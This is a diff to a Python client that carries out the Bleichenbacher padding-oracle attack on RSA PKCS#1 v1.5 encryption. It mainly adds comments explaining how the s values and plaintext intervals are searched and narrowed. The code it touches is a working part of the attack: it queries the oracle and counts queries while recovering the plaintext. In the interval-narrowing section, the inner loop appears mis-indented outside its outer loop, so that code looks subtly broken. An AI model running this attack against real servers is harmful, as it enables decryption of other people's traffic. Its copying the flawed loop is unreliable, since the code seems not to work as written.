@@ -211,6 +211,12 @@ class BleichenbacherClient:
 
         Implements Bleichenbacher Step 2b (single interval) and 2c (multiple intervals).
 
+        Mathematical basis:
+        - When we multiply ciphertext by s^e, plaintext gets multiplied by s (mod n)
+        - For m·s to be conforming (start with 0x00 0x02), we need: 2B ≤ m·s < 3B (mod n)
+        - Due to modular arithmetic, there exists integer r where: 2B + r·n ≤ m·s < 3B + r·n
+        - Since m ∈ [a,b], we can solve for s: (2B + r·n)/b ≤ s ≤ (3B - 1 + r·n)/a
+
         Args:
             c: Ciphertext as integer
             s_prev: Previous s value
@@ -228,18 +234,28 @@ class BleichenbacherClient:
         """
         queries_used = 0
 
-        # Step 2b: Searching with one interval (more efficient)
+        # Step 2b: Searching with one interval (optimized search)
+        # When interval is narrow, we can calculate which s values are likely to work
+        # instead of testing every s sequentially
         if len(M) == 1:
             a, b = M[0]
-            # Calculate a better starting point based on the interval
+
+            # Calculate starting r value (the "band" in modular arithmetic)
+            # r represents how many times we've "wrapped around" the modulus n
+            # This estimates which band is most likely based on our current interval
             r = (2 * (b * s_prev - 2 * B) + n - 1) // n  # ceiling division
 
             while True:
-                # Calculate s range for this r
-                s_min = (2 * B + r * n + b - 1) // b  # ceiling division
-                s_max = (3 * B - 1 + r * n) // a  # floor division
+                # For this r, calculate the range of s values that keep m·s conforming
+                # These come from solving: 2B + r·n ≤ m·s < 3B + r·n for s
+                # Since we know a ≤ m ≤ b, we get:
+                # ceiling: minimum s for upper bound
+                s_min = (2 * B + r * n + b - 1) // b
+                # floor: maximum s for lower bound
+                s_max = (3 * B - 1 + r * n) // a
 
-                # Search through this range
+                # Search through this calculated range instead of testing all s values
+                # This is much faster than linear search when intervals are narrow
                 for s in range(max(s_min, s_prev + 1), s_max + 1):
                     queries_used += 1
                     total_queries = oracle_queries + queries_used
@@ -267,12 +283,15 @@ class BleichenbacherClient:
                         self._write_progress(message)
                         return s, queries_used
 
-                # Move to next r value
+                # No valid s found in this r band, try next band
+                # (move to next "wrap around" of the modulus)
                 r += 1
 
-        # Step 2c: Searching with multiple intervals (original linear search)
+        # Step 2c: Searching with multiple intervals (simpler linear search)
+        # When we have multiple disjoint intervals, the optimization is less effective
+        # so we fall back to testing each s value sequentially
         else:
-            s = s_prev + 1
+            s = s_prev + 1  # Start from next value after previous
 
             while True:
                 queries_used += 1
@@ -296,10 +315,8 @@ class BleichenbacherClient:
                     message = f"[*] Iteration: {iteration:<5} | Queries: {total_queries:<8} | Rate: {qps:>6.1f} q/s | Width: {'N/A':<8} | Elapsed: {int(elapsed):>6}s | value={interval_str}\n"
                     self._write_progress(message)
                     return s, queries_used
-                    sys.stdout.flush()
-                    return s, queries_used
 
-                s += 1
+                s += 1  # Try next value (linear search)
 
     def _narrow_solution_space(self, ciphertext: bytes, s0: int) -> Optional[bytes]:
         """
@@ -361,15 +378,19 @@ class BleichenbacherClient:
                 self._write_progress(message)
 
                 # Step 2.c/3: Narrow the set of solutions based on current s
+                # Now that we found an s that produces conforming m·s, we can narrow our intervals
+                # For each interval [a,b] of possible m values, we calculate which values in that
+                # range would produce conforming m·s (considering the modulus wrapping)
                 new_intervals = []
                 for a, b in intervals:
-                    # Calculate r_min and r_max
+                    # Calculate r_min and r_max (possible "wrap around" counts)
                     # ceiling division
                     r_min = (a * s - 3 * B + 1 + n - 1) // n
                     r_max = (b * s - 2 * B) // n  # floor division
 
                 for r in range(r_min, r_max + 1):
-                    # Calculate new interval bounds
+                    # For each r, calculate which part of [a,b] produces conforming m·s
+                    # Solving: 2B + r·n ≤ m·s < 3B + r·n for m
                     new_a = max(a, (2 * B + r * n + s - 1) // s)
                     new_b = min(b, (3 * B - 1 + r * n) // s)
 
